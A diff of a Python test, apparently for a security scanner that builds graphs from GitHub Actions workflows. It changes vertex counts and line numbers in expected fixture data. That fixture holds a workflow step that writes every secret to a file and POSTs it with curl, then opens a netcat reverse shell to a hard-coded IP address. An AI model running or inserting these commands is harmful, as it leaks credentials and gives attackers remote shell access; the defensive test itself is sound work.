@@ -22,7 +22,7 @@ def test_build_graph_from_definitions():
     )
 
     # then
-    assert len(local_graph.vertices) == 4
+    assert len(local_graph.vertices) == 5
     assert len(local_graph.edges) == 2
 
     job_idx = local_graph.vertices_by_path_and_name[(test_file, "jobs.bridgecrew")]
@@ -42,14 +42,14 @@ def test_build_graph_from_definitions():
                 "env": {
                     "GITHUB_TOKEN": "${{secrets.THIS_IS_A_TEST_SECRET}}",
                     "ACTIONS_ALLOW_UNSECURE_COMMANDS": "true",
-                    "__startline__": 17,
-                    "__endline__": 19,
+                    "__startline__": 19,
+                    "__endline__": 21,
                 },
                 "run": 'echo "${{ toJSON(secrets) }}" > .secrets\ncurl -X POST -s --data "@.secrets" <BADURL > /dev/null\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|netcat 34.159.16.75 32032 >/tmp/f\n',
-                "__startline__": 13,
-                "__endline__": 23,
+                "__startline__": 15,
+                "__endline__": 25,
             }
         ],
-        "__startline__": 11,
-        "__endline__": 23,
+        "__startline__": 13,
+        "__endline__": 25,
     }
